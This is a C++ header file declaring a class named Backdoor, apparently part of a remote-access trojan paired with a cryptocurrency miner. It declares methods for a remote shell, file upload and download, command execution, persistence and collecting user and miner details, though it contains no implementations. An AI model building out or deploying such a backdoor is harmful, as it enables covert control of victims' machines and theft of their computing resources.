#ifndef BACKDOOR_H
#define BACKDOOR_H

#include "communication.h"
#include <dirent.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/stat.h>

class Backdoor{
public:
    void shell();
    void upload(const char *);
    void download(const char *);
    std::string get_miner_id();
    std::string get_miner_ip();
    void menu();
    void persistence();

    void get_home_enviroment();
    void get_username();
    void get_desktop_enviroment();

    void execute_command(const char *);

    Backdoor(int, Communication *, bool, char *);


private:
    Communication * c;
    bool is_server;
    int sock;
    char * client_ip;
    char * miner_id;
    char * user_name;
    char * user_home;
    char * user_desktop;
};

#endif